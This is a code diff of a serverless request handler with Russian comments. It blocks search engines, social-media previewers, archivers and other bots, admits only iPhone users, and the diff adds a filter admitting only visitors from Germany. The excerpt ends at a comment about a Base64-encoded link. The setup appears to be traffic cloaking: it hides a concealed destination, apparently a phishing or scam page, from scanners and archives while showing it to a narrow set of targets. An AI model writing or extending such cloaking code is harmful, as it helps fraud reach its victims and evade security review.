@@ -1,10 +1,11 @@
 export default async function handler(req, res) {
   const userAgent = req.headers['user-agent'] || '';
   const acceptLang = req.headers['accept-language'] || '';
-  const cf = req.headers['x-vercel-forwarded-for'] || '';
+  const country = req.headers['cf-ipcountry'] || ''; // страна по IP
 
   const isBot = /(google|bot|crawler|spider|facebook|preview|archive|bing)/i.test(userAgent);
-  const isIphone = /iPhone/i.test(userAgent); // Проверка на iPhone
+  const isIphone = /iPhone/i.test(userAgent);
+  const isGermany = country.toUpperCase() === 'DE'; // Проверка на Германию
 
   if (isBot) {
     return res.status(403).json({ status: 'bot' });
@@ -12,6 +13,10 @@ export default async function handler(req, res) {
 
   if (!isIphone) {
     return res.status(403).json({ status: 'not_iphone' });
+  }
+
+  if (!isGermany) {
+    return res.status(403).json({ status: 'not_germany' });
   }
 
   // Зашифрованная ссылка (Base64)
